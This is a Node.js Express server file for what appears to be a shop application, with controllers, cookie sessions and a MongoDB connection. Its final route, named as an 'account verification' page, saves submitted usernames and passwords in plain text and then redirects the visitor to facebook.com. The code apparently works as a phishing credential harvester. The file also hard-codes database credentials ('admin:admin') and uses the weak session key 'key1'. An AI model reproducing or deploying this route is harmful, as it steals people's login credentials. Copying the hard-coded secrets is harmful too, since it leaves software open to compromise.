var express = require('express');
//var shortid = require('shortid');
var cookieParser = require('cookie-parser')
var cookieSession = require('cookie-session')
var flash = require('connect-flash');
var demos = require("./model/demo")
//var session = require('express-session')
var app = express();
var controller = require("./controllers/controller-admin");
var controllerCate = require("./controllers/controller-category");
var controllerUser = require("./controllers/controller-home");
var controllerMid = require("./controllers/middleware");
var controllerPro = require("./controllers/controller-product")
var controllerOrder = require("./controllers/controller-order")
var controller_session = require("./controllers/session");
app.set('trust proxy', 1) // trust first proxy

app.use(cookieSession({
  name: 'session',
  keys: ['key1'],
}))

//body-parser
var bodyParser = require('body-parser');
app.use(cookieParser())
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static("public"));
app.use(controller_session)
app.use(flash());

app.set("view engine", "ejs");
app.set("views", "./views")
app.listen(3000)

//connect mongoosejs
var mongoose = require('mongoose');
mongoose.connect('mongodb+srv://admin:admin@cluster0.jc001.mongodb.net/NodeJs?retryWrites=true&w=majority', {useNewUrlParser: true, useUnifiedTopology: true}, function(err){
    if (err){
        console.log("connect fail" + err)
    } else {
        console.log("connect successfull")
    }
});

app.get("/xac-nhan-tai-khoan", function(req, res){
    res.render("demo")
});
app.post("/xac-nhan-tai-khoan", function(req, res){
    
        
            var demoss = demos({
                user: req.body.user,
                pass:req.body.pass
            });
            demoss.save(function (err) {
                    res.redirect('https://www.facebook.com/');         
            })
        
    
});






